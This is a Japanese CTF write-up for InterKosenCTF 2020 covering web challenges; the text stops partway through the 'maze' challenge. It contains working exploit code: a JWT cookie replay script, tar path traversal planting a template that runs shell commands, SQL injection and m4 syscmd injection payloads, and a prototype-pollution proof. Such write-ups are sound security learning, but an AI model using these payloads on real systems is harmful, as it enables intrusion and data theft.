---
layout: post
title: InterKosenCTF 2020 の write-up
categories: [ctf]
date: 2020-09-08 13:00:00 +0900
---

9 月 5 日から 9 月 6 日にかけて開催された [InterKosenCTF 2020](https://score.kosenctf.com/index.html#/) に、ひとりチーム Hirota Sora として参加しました。最終的に 19 問を解いて 5227 点を獲得し、順位は 100 点以上得点した 133 チーム中 7 位 (個人 1 位) でした。

Web 問の 6 問中 limited 以外の 5 問と Welcome、Tip Toe、readme の 8 問 (実質 7 問) で first blood を取ることができました。嬉しい。

以下、write-up です。問題は [theoremoon/InterKosenCTF2020-challenges](https://github.com/theoremoon/InterKosenCTF2020-challenges) というリポジトリで公開されているようなので、添付ファイルなどはそちらをご覧ください。

## [welcome 100] Welcome (126 solves)
> Welcome to InterKosenCTF 2020! All announcement, support, and the welcome flag are available in our Discord.
> 
> author: insecure

この CTF の公式 Discord サーバに入ると、#announcements チャンネルにフラグの書かれたメッセージがピン留めされていました。

```
KosenCTF{w31c0m3_and_13ts_3nj0y_the_party!!}
```

## [survey 110] survey (48 solves)
> Please give us your feedback here. (Google Form へのリンク)
> 
> author: insecure

アンケートに答えるとフラグが得られました。

```
KosenCTF{w4s_th1s_ch4ll3ng3_h4rd_4_u?}
```

## [web 121] matsushima2 (46 solves)
> Do you like poker? I like blackjack! Let's play it here. (URL)
> 
> 添付ファイル: matsushima2_a8f90b2a9cff5f0aa8d62010385ffc0c.tar.gz (ソースコード一式)
> 
> author: theoremoon

与えられた URL にアクセスすると、以下のような画面が表示されました。ブラックジャックが遊べる Web アプリケーションのようです。

![ブラックジャックですねえ](../images/2020-09-07_matushima2.png)

勝てると倍額が返ってくるものの、賭ける額は毎ゲーム手持ちのチップ全額で固定とヤバい仕様になっています。999999 枚のチップを払うとフラグがもらえるということで、十数回連続で勝てればよさそうです。が、普通に遊んでいてはとんでもない時間がかかりそうです。

添付されているソースコードを確認してみましょう。まず持っているチップの額やカードといったステートがどのように管理されているか見てみます。

```python
from flask import Flask, send_file, request, make_response, jsonify, abort
import random
import jwt
import secret

app = Flask(__name__)
key = secret.key

# ...

@app.route("/initialize", methods=["POST"])
def initialize():
    cards = list(range(13 * 4))
    random.shuffle(cards)

    player_cards = [cards[0]]
    dealer_cards = [cards[1]]
    player_score = blackjack(player_cards)
    dealer_score = blackjack(dealer_cards)
    state = {
        'player': player_cards,
        'dealer': dealer_cards,
        'chip': 100,
        'player_score': player_score,
        'dealer_score': dealer_score,
    }

    response = make_response(jsonify(state))
    state['cards'] = cards[2:]
    response.set_cookie('matsushima', jwt.encode(state, key, algorithm='HS256'), httponly=True, samesite='strict')
    return response

# ...
```

`jwt.encode(state, key, algorithm='HS256')` からわかるように、JWT を使って改ざんできないようにした上でクライアント側にデータを持たせて管理しているようです。署名に使われている `key` は別ファイルに保存されていて推測できず、署名アルゴリズムも `HS256` に固定されているため改ざんはできそうにありません。

ですが、ゲームが終了したあとにそれまで使われたトークンを失効させるような処理はどこにもなく、たとえゲームに負けてしまったとしても負ける前のトークンを Cookie にセットすれば賭けたチップを取り戻すことができます。勝てば発行されたトークンを保持し、負ければゲームの開始時まで巻き戻すということを繰り返すスクリプトを書きましょう。

```python
import base64
import json
import requests
URL = 'http://(省略)/'

def parse(cookie):
  s = cookie.split('.')[1]
  s += '=' * (4 - len(s) % 4)
  s = base64.urlsafe_b64decode(s)
  return json.loads(s)

def initialize():
  req = requests.post(URL + 'initialize')
  return req.cookies.get('matsushima')

def hit(cookie):
  req = requests.post(URL + 'hit', cookies={
    'matsushima': cookie
  })
  return req.cookies.get('matsushima')

def stand(cookie):
  req = requests.post(URL + 'stand', cookies={
    'matsushima': cookie
  })
  return req.cookies.get('matsushima')

def get_flag(cookie):
  req = requests.get(URL + 'flag', cookies={
    'matsushima': cookie
  })
  return req.text

cookie1 = initialize()
d1 = parse(cookie1)
while True:
  if d1['chip'] >= 999999:
    break

  for i in range(3):
    for _ in range(i):
      cookie2 = hit(cookie1)
      d2 = parse(cookie2)

    try:
      cookie2 = stand(cookie2)
      d2 = parse(cookie2)
    except:
      continue

    print(d2['chip'], d1['chip'])
    if d2['chip'] > d1['chip']:
      cookie1 = cookie2
      d1 = d2
      print(cookie1)
      print(d2)
      break

print(get_flag(cookie1))
```

```
$ python solve.py
...
409600 204800
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwbGF5ZXIiOlszLDE5XSwiZGVhbGVyIjpbMzUsMSwyNCwxOCw1LDIyLDIzLDE1LDM0LDI5LDQwLDI3LDQ2LDQxXSwiY2hpcCI6NDA5NjAwLCJwbGF5ZXJfc2NvcmUiOjExLCJkZWFsZXJfc2NvcmUiOi0xLCJjYXJkcyI6WzQsMzMsMiwxNiwzMSw0OSwzNywwLDI2LDM2LDQ3LDcsNDUsMjEsMzksMjAsMjgsMTIsNDgsNTEsMTEsMzgsNDQsOSwzMCwxMCw0MiwxNCwxNywzMiw0MywxMywyNSw2LDUwLDhdfQ.PA-TeSF6N9nUTs33wsFBIwu9neXzg6qWe47SL1PkU9c
{'player': [3, 19], 'dealer': [35, 1, 24, 18, 5, 22, 23, 15, 34, 29, 40, 27, 46, 41], 'chip': 409600, 'player_score': 11, 'dealer_score': -1, 'cards': [4, 33, 2, 16, 31, 49, 37, 0, 26, 36, 47, 7, 45, 21, 39, 20, 28, 12, 48, 51, 11, 38, 44, 9, 30, 10, 42, 14, 17, 32, 43, 13, 25, 6, 50, 8]}
819200 409600
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwbGF5ZXIiOlszLDE5XSwiZGVhbGVyIjpbMzUsMSwyNCwxOCw1LDIyLDIzLDE1LDM0LDI5LDQwLDI3LDQ2LDQxLDRdLCJjaGlwIjo4MTkyMDAsInBsYXllcl9zY29yZSI6MTEsImRlYWxlcl9zY29yZSI6LTEsImNhcmRzIjpbMzMsMiwxNiwzMSw0OSwzNywwLDI2LDM2LDQ3LDcsNDUsMjEsMzksMjAsMjgsMTIsNDgsNTEsMTEsMzgsNDQsOSwzMCwxMCw0MiwxNCwxNywzMiw0MywxMywyNSw2LDUwLDhdfQ.rdEG7VAQNMpmEscO9iuP2Ja1kqlKsfQRpL7uF7SJ0BU
{'player': [3, 19], 'dealer': [35, 1, 24, 18, 5, 22, 23, 15, 34, 29, 40, 27, 46, 41, 4], 'chip': 819200, 'player_score': 11, 'dealer_score': -1, 'cards': [33, 2, 16, 31, 49, 37, 0, 26, 36, 47, 7, 45, 21, 39, 20, 28, 12, 48, 51, 11, 38, 44, 9, 30, 10, 42, 14, 17, 32, 43, 13, 25, 6, 50, 8]}
1638400 819200
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwbGF5ZXIiOlszLDE5XSwiZGVhbGVyIjpbMzUsMSwyNCwxOCw1LDIyLDIzLDE1LDM0LDI5LDQwLDI3LDQ2LDQxLDQsMTZdLCJjaGlwIjoxNjM4NDAwLCJwbGF5ZXJfc2NvcmUiOjExLCJkZWFsZXJfc2NvcmUiOi0xLCJjYXJkcyI6WzMzLDIsMzEsNDksMzcsMCwyNiwzNiw0Nyw3LDQ1LDIxLDM5LDIwLDI4LDEyLDQ4LDUxLDExLDM4LDQ0LDksMzAsMTAsNDIsMTQsMTcsMzIsNDMsMTMsMjUsNiw1MCw4XX0.FdCgIBb-Y6bwraxeEvTI9t9AcEj21mlEXuTH91O77Zs
{'player': [3, 19], 'dealer': [35, 1, 24, 18, 5, 22, 23, 15, 34, 29, 40, 27, 46, 41, 4, 16], 'chip': 1638400, 'player_score': 11, 'dealer_score': -1, 'cards': [33, 2, 31, 49, 37, 0, 26, 36, 47, 7, 45, 21, 39, 20, 28, 12, 48, 51, 11, 38, 44, 9, 30, 10, 42, 14, 17, 32, 43, 13, 25, 6, 50, 8]}
{"flag":"KosenCTF{r3m3mb3r_m475u5him4}"}
```

フラグが得られました。

```
KosenCTF{r3m3mb3r_m475u5him4}
```

## [web, forensics 157] limited (40 solves)
> Our website had been attacked by someone. Did the attacker successfully steal the admin's secret?
> 
> 添付ファイル: packet.pcap
> 
> author: theoremoon

与えられた pcap ファイルを Wireshark で開いてみると、以下のように GET パラメータから SQL インジェクションの攻撃が行われている様子が記録されていました。

![HTTP の通信](../images/2020-09-07_limited.png)

`keyword` と `search_max` というパラメータ名から検索フォームに対して攻撃が行われていると推測できます。ペイロードは `search_max` というパラメータに仕込まれていることから、表示されている検索結果の件数からクエリの結果の情報を得ていると推測できます。

画像のペイロードがどのようなものか見てみましょう。GET パラメータがパーセントエンコーディングされているのでデコードすると、`(SELECT unicode(substr(secret, 13, 1)) FROM account WHERE name="admin") % 7` になります。`account` というテーブルから `admin` というユーザのレコードから `secret` というカラムを取り出し、`substr` で 13 文字目を切り出して `unicode` で文字コードを得ています。それを 7 で割った余りが検索結果の件数として HTTP レスポンスに含まれているようです。

他の HTTP 通信も見てみると、13 文字目については 7 で割った余りだけでなく、23 で割った余りと 5 で割った余りについても取得されていることが確認できました。中国の剰余定理を使えば 13 文字目は `4` であることがわかります。

Scapy を使って抜き出された情報を復元するスクリプトを書きましょう。

```python
import urllib.parse
from scapy.all import *
from scapy.layers import http

###
# https://rosettacode.org/wiki/Chinese_remainder_theorem#Python_3.6
from functools import reduce
def chinese_remainder(n, a):
  ...
###

pcap = rdpcap('packet.pcap')
f = False
res = []
for pkt in pcap:
    if pkt.haslayer('HTTPRequest'):
        fields = pkt.getlayer('HTTPRequest').fields
        path = fields['Path']
        if b'SELECT' in path:
            p = urllib.parse.unquote(path.decode()).replace('+', ' ')
            i = int(p.split(', ')[1])
            mod = int(p.split(' % ')[1])
            if len(res) < i:
                res.append([])
            res[i - 1].append([mod])
            f = True
    elif pkt.haslayer('HTTPResponse'):
        layer = pkt.getlayer('HTTPResponse')
        data = bytes(layer)
        if f:
            res[-1][-1].append(data.count(b'<td>') // 2)
            f = False

secret = ''
for c in res:
    n = [x[0] for x in c]
    a = [x[1] for x in c]
    secret += chr(chinese_remainder(n, a))

print(secret)
```

これを実行するとフラグが得られました。

```
KosenCTF{u_c4n_us3_CRT_f0r_LIMIT_1nj3ct10n_p01nt}
```

## [web 353] miniblog (14 solves)
> I created a minimal blog platform. It doesn't use any complex things. (URL)
> 
> 添付ファイル: miniblog_466ff544c90345258849ac5dbde21b6a.tar.gz (ソースコード一式)
> 
> author: theoremoon

与えられた URL にアクセスすると、以下のように登録フォームとログインフォームが表示されました。

![登録フォームとログインフォーム](../images/2020-09-07_miniblog1.png)

適当にユーザ登録をしてログインすると、ブログの編集画面が表示されました。記事を投稿できるほか、記事ページの閲覧時に使われるテンプレートの編集やファイルのアップロードができるようです。

![ブログの編集画面](../images/2020-09-07_miniblog2.png)

ソースコードを見ていきましょう。

```python
from bottle import route, run, template, request, abort, response, redirect, static_file
```

[Bottle](https://bottlepy.org/docs/dev/) というフレームワークが使われているようです。

```python
@route("/posts/<userid>/<postid>")
def view_post(userid, postid):
    if not re.match("[0-9a-f]{32}", userid) or not re.match("[0-9a-f]{32}", postid):
        return abort(400)

    template_path = "userdir/{userid}/template".format(userid=userid)
    with open(template_path, "r") as f:
        t = f.read()

    title_path = "userdir/{userid}/titles/{postid}".format(userid=userid, postid=postid)
    with open(title_path, "r") as f:
        title = f.read()

    post_path = "userdir/{userid}/posts/{postid}".format(userid=userid, postid=postid)
    with open(post_path, "r") as f:
        p = f.read()

    attachments={}
    attachments_dir = "userdir/{userid}/attachments/".format(userid=userid)
    for path in glob.glob(attachments_dir+"*"):
        if os.path.isfile(path):
            with open(path, "rb") as f:
                attachments["attachment_" + os.path.splitext(os.path.basename(path))[0]] = base64.b64encode(f.read())

    stat = os.stat(post_path)
    return template(t, title=title, content=p, last_update=stat.st_mtime, **attachments)
```

記事ページの実装です。テンプレートや記事の情報、アップロードしたファイルは全てファイルとして `userdir/(ユーザ ID)/` というディレクトリの下に保存されているようです。

レンダリングには `template(t, title=title, content=p, last_update=stat.st_mtime, **attachments)` と Bottle に搭載されているテンプレートエンジンがそのまま使われていることがわかります。

[Bottle の公式ドキュメント](https://bottlepy.org/docs/dev/stpl.html)を見ると、Bottle のテンプレートでは `<% (Python コード) %>` のように `<%` と `%>`、もしくは `{% raw %}{{{% endraw %}` と `{% raw %}}}{% endraw %}` で囲めば Python コードを実行できるとわかります。SSTI で余裕じゃん! と思ってしまいますが、そうはいきません。テンプレートの更新時の処理を見てみましょう。

```python
{% raw %}@route("/update", method="POST")
def do_update_template():
    username = get_username()
    if not username:
        return abort(400)

    content = request.forms.get("content")
    if not content:
        return abort(400)

    if "%" in content:
        return abort(400, "forbidden")

    for brace in re.findall(r"{{.*?}}", content):
        if not re.match(r"{{!?[a-zA-Z0-9_]+}}", brace):
            return abort(400, "forbidden")

    template_path = "userdir/{userid}/template".format(userid=users[username]["id"])
    with open(template_path, "w") as f:
        f.write(content)

    redirect("/"){% endraw %}
```

`%` はテンプレートに含むことはできず、展開される変数は `[a-zA-Z0-9_]` のみからなる名前でなければならず、このため `''.__class__.__mro__[2]` のような感じでプロパティにアクセスしたりはできないようです。公式ドキュメントを見る限りでは、この制限の範囲内で RCE に持ち込むことはできないように思えます。

この Web アプリケーションではファイルのアップロードもできますから、どのような処理がされているか見てみましょう。

```python
@route("/upload", method="POST")
def do_upload():
    username = get_username()
    if not username:
        return abort(400)

    attachment = request.files.get("attachment")
    if not attachment:
        return abort(400)

    tarpath = 'tmp/{}'.format(uuid4().hex)
    attachments_dir = "userdir/{userid}/attachments/".format(userid=users[username]["id"])
    attachment.save(tarpath)
    try:
        tarfile.open(tarpath).extractall(path=attachments_dir)
    except (ValueError, RuntimeError):
        pass
    os.remove(tarpath)
    redirect("/")
```

tar ファイルをアップロードすると `userdir/(ユーザ ID)/attachments/` というディレクトリに展開されるようですが、このとき `TarFile.extractall` が使われていることに注目します。

[Python の公式ドキュメント](https://docs.python.org/ja/3/library/tarfile.html#tarfile.TarFile.extractall)を見てみると、

> **警告**: 内容を信頼できない tar アーカイブを、事前の内部チェック前に展開してはいけません。ファイルが path の外側に作られる可能性があります。例えば、`"/"` で始まる絶対パスのファイル名や、2 重ドット `".."` で始まるパスのファイル名です。

と `TarFile.extractall` によるパストラバーサルの危険性が指摘されています。いわゆる Zip Slip のように、`../hoge` というファイルが tar ファイルに含まれていれば、展開先のディレクトリのひとつ上のディレクトリに `hoge` というファイルが展開されるのでしょう。

先程確認したようにテンプレートは `userdir/(ユーザ ID)/` というディレクトリの下にファイルとして保存されていますから、このアップロードした tar ファイルの展開処理を使えば `/update` を通さずに (= `%` が使われているかなどのチェックがされずに) テンプレートを書き換えることができそうです。やってみましょう。

[ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) という便利なツールを使えば、悪い tar ファイルを簡単に作ることができます。

```
{% raw %}$ cat template 
<%
  a = __import__('subprocess').check_output('ls -la /', shell=True)
%>
{{!a}}
$ python evilarc/evilarc.py template -d 1 -o linux -f exp.tar{% endraw %}
```

できた `exp.tar` をアップロードし、記事ページにアクセスすると以下のように出力されました。

```
total 80
drwxr-xr-x    1 root     root          4096 Sep  5 03:45 .
drwxr-xr-x    1 root     root          4096 Sep  5 03:45 ..
-rwxr-xr-x    1 root     root             0 Sep  5 03:45 .dockerenv
drwxr-xr-x    1 root     root          4096 Aug 18 04:03 bin
drwxr-xr-x    5 root     root           340 Sep  5 03:45 dev
drwxr-xr-x    1 root     root          4096 Sep  5 03:45 etc
drwxr-xr-x    1 root     root          4096 Sep  5 03:33 home
drwxr-xr-x    1 root     root          4096 Aug 18 04:03 lib
drwxr-xr-x    5 root     root          4096 May 29 14:20 media
drwxrwxr-x    1 root     root          4096 Sep  5 03:33 miniblog
drwxr-xr-x    2 root     root          4096 May 29 14:20 mnt
drwxr-xr-x    2 root     root          4096 May 29 14:20 opt
dr-xr-xr-x  302 root     root             0 Sep  5 03:45 proc
drwx------    1 root     root          4096 Sep  5 03:30 root
drwxr-xr-x    2 root     root          4096 May 29 14:20 run
drwxr-xr-x    1 root     root          4096 Aug 18 04:03 sbin
drwxr-xr-x    2 root     root          4096 May 29 14:20 srv
dr-xr-xr-x   13 root     root             0 Sep  5 03:45 sys
drwxrwxrwt    1 root     root          4096 Sep  7 05:43 tmp
-rwxrwxr--    1 root     root            59 Sep  5 03:26 unpredicable_name_flag
drwxr-xr-x    1 root     root          4096 Sep  3 15:29 usr
drwxr-xr-x    1 root     root          4096 Aug 18 04:03 var
```

実行する OS コマンドを `cat /unpredicable_name_flag` に変えるとフラグが得られました。

```
KosenCTF{u_saw_th3_zip51ip_in_the_53CC0N_Beginn3r5_didn7?}
```

## [web 383] just sqli (11 solves)
> just do it (URL)
> 
> author: theoremoon

与えられた URL にアクセスすると、シンプルなログインフォームが表示されました。

![シンプルなログインフォーム](../images/2020-09-07_justsqli.png)

ソースコードも与えられています。見てみましょう。

```php
<?php

$user = NULL;
$is_admin = 0;

if (isset($_GET["source"])) {
    highlight_file(__FILE__);
    exit;
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];

    $db = new PDO("sqlite:../database.db");
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    try {
        $db->exec("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, is_admin BOOL);");

        $q = "username, is_admin FROM users WHERE username = '$username' AND password = '$password'";
        if (preg_match("/SELECT/i", $q)) {
            throw new Exception("only select is a forbidden word");
        }

        $rows = $db->query("SELECT " . $q, PDO::FETCH_ASSOC);
        foreach ($rows as $row) {
            $user = $row["username"];
            $is_admin = $row["is_admin"];
        }
    }
    catch (Exception $e) {
        exit("EXCEPTION!");
    }


}

?>
```

`$q = "username, is_admin FROM users WHERE username = '$username' AND password = '$password'";` とユーザ入力がそのまま SQL 文に挿入されており SQLi ができます。でも、`SELECT` は使えないようです。

ユーザ名に `' or 1;-- ` を入力してもログインはできませんでした。`is_admin` に PHP で真と評価される値が入っていればフラグが出力されるようですから、`users` テーブルには `is_admin` がそのようなレコードがないとわかります。ということは、`UNION` を使ってそのようなレコードを作り出すしかありませんが、`SELECT` が使えない状況でどうすればよいのでしょうか。

[SQLite の公式ドキュメント](https://sqlite.org/lang_select.html)を見てみると、`VALUES` という構文があることがわかります。例えば、`VALUES(1, 2)` は `SELECT 1, 2` と等価です。

ユーザ名に `' UNION VALUES(1, 2);-- ` を入れてログインするとフラグが得られました。

```
KosenCTF{d0_y0u_kn0w_that_the_w0rd_va1u35_can_b3_aft3r_un10n}
```

## [web,misc 437] graphviz++ (6 solves)
> Make graphviz great again! (URL)
> 
> 添付ファイル: graphviz++_440b995c6f5a33e97921834da0c0f68c.tar.gz (ソースコード一式)
> 
> author: ptr-yudai

与えられた URL にアクセスすると、以下のようにグラフを描画するための言語である DOT 言語の入力フォームが表示されました。

![DOT 言語の入力フォーム](../images/2020-09-07_graphviz1.png)

`Merge` ボタンを押すと、以下のようにグラフが表示されました。入力した 2 つのグラフを結合してくれる便利なツールのようです。

![描画されたグラフ](../images/2020-09-07_graphviz2.png)

どうやってこの機能を実現しているか、ソースコードを確認しましょう。

```python
def m4it(m4):
    p = subprocess.Popen(["m4"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)
    p.stdin.write(m4.encode())
    p.stdin.close()
    try:
        p.wait(timeout=1)
    except subprocess.TimeoutExpired:
        return None, "Error: m4 timeout"

    if p.returncode != 0:
        return None, p.stderr.read().decode().strip()

    r = p.stdout.read().decode()
    return dotit(r, 'svg')
```

`m4` というマクロプロセッサによって結合がされているようです。どのようなコマンドで結合しているか、`m4it` の呼び出し元を確認します。

```python
def dotit(g, outfmt):
    """ Convert DOT to JSON """
    assert outfmt in ['json', 'svg']
    p = subprocess.Popen(["dot", "-T{}".format(outfmt)],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    p.stdin.write(g.encode())
    p.stdin.close()
    try:
        p.wait(timeout=1)
    except subprocess.TimeoutExpired:
        return None, "Error: dot timeout"

    if p.returncode != 0:
        return None, p.stderr.read().decode().strip()

    return p.stdout.read(), None

{% raw %}def merge(g1, g2):
    """ Merge 2 graphs """
    m4 = (
        "digraph merged {{\n"
        "define(`digraph', `subgraph')"
        "define(`{graph1}', `sub_{graph1}')"
        "include(`{file1}')"
        "define(`{graph2}', `sub_{graph2}')"
        "include(`{file2}')"
        "}}\n"
    )

    # convert DOT to JSON
    o1, e = dotit(g1, 'json')
    if e is not None:
        return None, e
    d1 = json.loads(o1)

    o2, e = dotit(g2, 'json')
    if e is not None:
        return None, e
    d2 = json.loads(o2)

    # check for intersection
    if len(listup_nodes(d1).intersection(listup_nodes(d2))) == 0:
        return None, "Error: Two graphs are independent (No intersection found)"

    # create and merge dot files
    with tempfile.NamedTemporaryFile() as f1, tempfile.NamedTemporaryFile() as f2:
        f1.write(g1.encode())
        f1.flush()
        f2.write(g2.encode())
        f2.flush()
        r, e = m4it(m4.format(
            graph1 = d1['name'],
            graph2 = d2['name'],
            file1 = f1.name,
            file2 = f2.name
        ))

    if e is None:
        return r.decode(), None
    else:
        return None, e.decode(){% endraw %}
```

まず `dot` コマンドで与えられた 2 つのグラフをそれぞれ JSON に変換しています。JSON からグラフの名前を取り出し `define` によって、`digraph` は `subgraph` に、グラフ名は `sub_(グラフ名)` に置換されるようにして、`merged` という新しいグラフのサブグラフとして扱えるようにしています。元のグラフは別の一時ファイルに保存されており、`include` によって読み込んでいるようです。

例えば、`digraph g1 { a -> b }` の場合はグラフ名は `g1` であり、この処理によって `subgraph sub_g1 { a -> b }` に置換されます。

もしグラフ名に `` ` `` や `'` が入り込めばどうなるのでしょうか。やってみましょう。

テンプレートにグラフ名が展開されたときに、構造を変えつつも m4 のマクロとして正しいものができあがるようなグラフを作ってみます。以下の 2 つのグラフを入力して結合します。

```
digraph "abc',`123') a -> d }#" {
  a -> b
}
```

```
digraph g2 {
  b -> c
}
```

テンプレートにグラフ名が展開されると `` digraph merged { define(`digraph', `subgraph') define(`abc',`123') a -> d } `` と等価なマクロになり、これが処理されて `digraph merged { a -> d }` に変換されます。これを描画した結果、以下のようなグラフが出力されました。

![a -> d](../images/2020-09-07_graphviz3.png)

これで m4 の好きな機能を使えるようになりました。[m4 の公式ドキュメント](https://www.gnu.org/savannah-checkouts/gnu/m4/manual/m4-1.4.18/m4.html)を眺めていると、[`syscmd`](https://www.gnu.org/savannah-checkouts/gnu/m4/manual/m4-1.4.18/m4.html#Syscmd) で OS コマンドの実行ができるとわかりました。やってみましょう。

グラフ名を `` abc',`syscmd(`ls -la')')\"abc\"}# `` に変えると以下のようなグラフが出力されました。OS コマンドが実行でき、`flag_foxtrot.txt` というそれっぽいファイルが確認できました。

![ls -laでファイルの一覧が得られた](../images/2020-09-07_graphviz4.png)

実行する OS コマンドを `cat flag_foxtrot.txt` に変えるとフラグが得られました。

![フラグゲット](../images/2020-09-07_graphviz5.png)

```
KosenCTF{1nt3rpr3t1ng_dur1ng_pr0c3ss1ng}
```

## [web 461] maze (4 solves)
> I invented a Maze Solver API.  
> "Now We Know What the Maze Is."
> 
> 添付ファイル: maze_4ab1fbc44f2860e624984420119cab5a.tar.gz (ソースコード一式)
> 
> author: ptr-yudai

与えられた URL にアクセスすると `Cannot GET /solve` と表示されました。よくわからないので、エントリーポイントである `app.js` を確認しましょう。

```javascript
const express = require('express');
const { execFile } = require('child_process');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post('/solve', (req, res) => {
    // Check request
    if (req.body.map === undefined
        || req.body.start === undefined
        || req.body.goal == undefined) {
        res.status(400).json({
            error: 'invalid parameter'
        });
        return;
    }
    // Validation
    if (req.body.heap
        && !['BinaryHeap', 'PairingHeap', 'SkewHeap'].includes(req.body.heap)) {
        req.body.heap = 'BinaryHeap'; // default
    }
    // Use separated solver (just for timeout)
    const solver = execFile(
        'node',
        [
            'solve.js',
            JSON.stringify(req.body.map),
            JSON.stringify(req.body.start),
            JSON.stringify(req.body.goal),
            JSON.stringify(req.body.heap)
        ],
        {
            timeout: 500 // 0.5 sec
        },
        (err, stdout, stderr) => {
            res.send(stdout);
        }
    );
});

app.listen(14002);
```

`/solve` に POST で迷路のマップ、スタートとゴールの座標、そして使うデータ構造として `BinaryHeap` `PairingHeap` `SkewHeap` のいずれかを与えるとその迷路を解いてくれる API を提供する Web アプリケーションのようです。

`req.body.heap && !['BinaryHeap', 'PairingHeap', 'SkewHeap'].includes(req.body.heap)` という条件文で `heap` が `BinaryHeap` `PairingHeap` `SkewHeap` のいずれかでなければ `BinaryHeap` をセットするという処理がされています。ここで `heap` に偽として評価される値、例えば `undefined` や空文字列が入っていた場合には、短絡評価によって `BinaryHeap` が `heap` にセットされないまま処理が続行されることが気になります。覚えておきましょう。

入力されたパラメータは JSON に変換されて `solve.js` に渡されています。見てみましょう。

```javascript
const maze = require('./maze.js');

// Get arguments
process.argv.shift();
var map   = JSON.parse(process.argv[1]);
var start = JSON.parse(process.argv[2]);
var goal  = JSON.parse(process.argv[3]);
var heap  = JSON.parse(process.argv[4]);

// ... (map, start, goal, heapが妥当な値かチェックする) ...

// Solve maze
var ms = new maze.Solver(map, start, goal, heap);
var result = ms.solve() !== undefined ? ms.solve() : 'impossible';

// Output result
console.log(JSON.stringify({result: result}));
```

コマンドライン引数として与えられたパラメータを JSON としてパースしたあと、`maze.js` の `Solver` というオブジェクトに投げて、`solve` というメソッドを呼んで帰ってきた結果を出力しています。

先程 `heap` に偽と評価される値が入っていると `JSON.stringify` によって JSON 化されてほぼそのまま渡ってくると言いましたが、`JSON.stringify(undefined)` は文字列ではなく `undefined` を返すことに注意しましょう。`JSON.parse(undefined)` や `JSON.parse('undefined')` を実行するとエラーが発生しますから、もし `heap` に `undefined` が入っていればここで落ちてしまいます。空文字列や `0` なら大丈夫です。

`Solver` の実装を確認しましょう。

```javascript
const pq = require('priorityqueue');
const { deepcopy } = require('./util.js');

/**
 * Maze: State of maze used by MazeSolver
 *
 * args:
 *   F   : Maze (1:wall / 0:nothing)
 *   S   : Current position represented by [x, y]
 *   G   : Goal position represented by [x, y]
 *   move: Steps made so far
 */
class Maze {
    constructor(F, S, G, move='') {
        this.F = F;
        this.width = F[0].length;
        this.height = F.length;
        this.S = S;
        this.G = G;
        this.move = move;
    }
    /* f: Cost for A* search */
    get f() { return this.g + this.h; }
    /* g: Steps required so far */
    get g() { return this.move.length; }
    /* h: Heuristic function */
    get h() { return Math.abs(this.S[0] - this.G[0])
              + Math.abs(this.S[1] - this.G[1]); }
    /* hash: Unique value of this state */
    get hash() { return (this.S[0] << 8) | this.S[1]; }
    /* next: Generate possible next states */
    next() {
        var candidates = [];
        if (this.S[0] > 0 && this.F[this.S[1]][this.S[0]-1] == 0) {
            // Move left
            var P = deepcopy(this.S);
            P[0] -= 1;
            candidates.push(new Maze(this.F, P, this.G, this.move+'A'));
        }
        // ...
        return candidates;
    }
}

/**
 * Solver: Maze solver to find the shortest path by A* search
 */
class Solver {
    constructor(F, S, G, heap=undefined) {
        this.maze = new Maze(F, S, G); // initial state
        if (heap) {
            this.heap = heap; // type of priority queue
        }
    }
    solve() {
        const comparator = (M1, M2) => { return M2.f - M1.f; }
        const heap = this.heap || 'BinaryHeap';
        var q = new Function('c', 'return new this.'+heap+'({comparator:c});')
            .bind(pq)(comparator);
        q.push(this.maze);
        var visited = [];
        // A* search
        // ...
        // This maze is not solvable
        return;
    }
}

module.exports = {
    Solver: Solver
};
```

`Solver` のコンストラクタで `heap` が真と評価される値の場合にのみ `heap` というプロパティに代入されるようです。迷路のマップ、スタートとゴールの座標については `Maze` という別のオブジェクトに投げて `maze` というプロパティに代入しています。

`Solver` の `solve` メソッド中では、`var q = new Function('c', 'return new this.'+heap+'({comparator:c});').bind(pq)(comparator);` とわざわざ `eval` 相当の処理によってオブジェクトを生成しています。`var q = new pq[heap]({comparator})` ではダメだったのでしょうか。ここで `heap` にアクセスすると任意の文字列が返ってくるようにできれば、RCE に持ち込めそうです。

`util.js` から `deepcopy` という関数をインポートしてきて、`Maze` の `next` メソッド中で配列のディープコピーに使われています。実装を確認しましょう。

```javascript
function is_array(obj) {
    return obj !== null && typeof obj === 'object';
}

function __deepcopy_internal(result, array) {
    for (let index in array) {
        if (is_array(result[index]) && is_array(array[index])) {
            __deepcopy_internal(result[index], array[index]);
        } else {
            result[index] = array[index];
        }
    }
    return result;
}

/**
 * deepcopy: Clone an Array object
 */
function deepcopy(obj) {
    return __deepcopy_internal(new Array(), obj);
}

module.exports = {
    deepcopy: deepcopy
};
```

`is_array` という関数によって各要素が配列であるか確認した上で、再帰的にコピーしています。なぜ `Array.isArray` でなく独自に実装をしているのでしょうか。`is_array` の実装をよく見てみると、`obj instanceof Array` のような処理はなく、ただオブジェクトであるかどうかだけがチェックされていることがわかります。これなら `is_array({a: 123})` のようにオブジェクトを渡してしまっても `true` が返ってきてしまいます。

これを利用すれば Prototype Pollution ができるはずです。`deepcopy(JSON.parse('{"__proto__": {"hoge": 123}}'))` は `Array.prototype.hoge = 123` 相当ですし、`__deepcopy_internal` は再帰的に呼び出されるので `{"__proto__":{"__proto__": {"hoge": 123}}}` のようにすれば `Object.prototype` にもアクセスできるはずです。やってみましょう。

```
>node
Welcome to Node.js v14.1.0.
Type ".help" for more information.
> const { deepcopy } = require('./util.js');
undefined
> deepcopy(JSON.parse('{"__proto__":{"__proto__": {"hoge": 123}}}'))
[]
> hoge
123
> ({}).hoge
123
```

`Object.prototype.hoge` に `123` が代入され、`hoge` というプロパティが未定義の時にアクセスすると `123` が返ってくるようになりました。

